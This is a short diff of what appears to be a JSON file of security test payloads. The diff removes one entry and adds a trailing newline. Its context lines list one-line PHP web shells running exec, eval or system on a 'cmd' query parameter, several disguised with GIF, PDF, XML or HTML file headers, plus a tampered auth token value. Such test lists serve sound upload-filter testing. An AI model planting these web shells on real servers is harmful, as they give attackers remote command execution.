@@ -448,7 +448,6 @@
     "<?php exec($_GET['cmd']); ?>",
     "<?php eval($_GET['cmd']); ?>",
     "GIF89a<?php system($_GET['cmd']); ?>",
-    "\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>",
     "%PDF-1.4<?php system($_GET['cmd']); ?>",
     "<?xml version=\"1.0\"?><?php system($_GET['cmd']); ?>",
     "<!DOCTYPE html><?php system($_GET['cmd']); ?>"
@@ -1088,3 +1087,4 @@
     "auth_token=tampered"
   ]
 }
+
